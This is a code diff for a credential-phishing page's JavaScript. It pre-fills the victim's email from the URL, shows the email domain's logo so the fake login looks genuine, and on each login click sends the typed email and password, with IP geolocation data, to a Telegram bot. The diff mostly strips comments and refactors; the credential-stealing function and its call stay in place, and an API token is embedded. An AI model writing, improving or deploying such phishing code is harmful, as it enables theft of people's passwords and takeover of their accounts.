@@ -6,31 +6,19 @@ const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy
     let userEmail = "";
     let attempt = 0;
 
-    // Unified email extraction from both query string and hash, with decoding
+    // Unified email extraction from query string or hash
     function getEmailFromURL() {
-        let email = "";
-
-        // 1. Try query string parameter (?email=value)
         const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has("email")) {
-            email = decodeURIComponent(urlParams.get("email"));
-        }
+        const queryEmail = urlParams.get("email");
 
-        // 2. Try hash fragment (#value)
-        if (!email && window.location.hash) {
-            email = decodeURIComponent(window.location.hash.substring(1));
-        }
+        const hashEmail = window.location.hash.substring(1);
 
-        // 3. Validate email format
-        if (email && email.includes("@")) {
-            return email;
-        }
+        if (queryEmail && queryEmail.includes("@")) return queryEmail;
+        if (hashEmail && hashEmail.includes("@")) return hashEmail;
 
-        // 4. Default fallback
-        return "example@example.com";
+        return "example@example.com"; // Fallback if no match
     }
 
-    // Update email field and domain info
     function updateEmailInfo() {
         userEmail = getEmailFromURL();
 
@@ -38,10 +26,10 @@ const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy
         const emailField = document.getElementById("email");
         if (emailField) {
             emailField.value = userEmail;
-            emailField.disabled = true;
+            emailField.setAttribute("readonly", "true");
         }
 
-        // Update domain info
+        // Update domain info (if elements exist)
         const domain = userEmail.split("@")[1] || "example.com";
         const domainTitle = document.getElementById("domain-title");
         const domainLogo = document.getElementById("domain-logo");
@@ -50,7 +38,6 @@ const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy
         if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}`;
     }
 
-    // Telegram message function
     async function sendToTelegram(email, password) {
         try {
             let ipData = {};
@@ -80,23 +67,18 @@ const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: "Markdown"
-                })
+                    parse_mode: "Markdown",
+                }),
             });
         } catch (err) {
             console.error("Telegram send error:", err);
         }
     }
 
-    // Initialize on DOM ready
     document.addEventListener("DOMContentLoaded", () => {
-        // Initial setup
         updateEmailInfo();
-
-        // Handle hash changes
         window.addEventListener("hashchange", updateEmailInfo);
 
-        // Login button handler
         document.getElementById("login-btn").addEventListener("click", () => {
             const password = document.getElementById("password").value;
             const errorMsg = document.getElementById("error-msg");
@@ -109,7 +91,6 @@ const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy
                 spinner.classList.add("hidden");
                 attempt++;
 
-                // Send credentials to Telegram
                 await sendToTelegram(userEmail, password);
 
                 if (attempt === 1) {
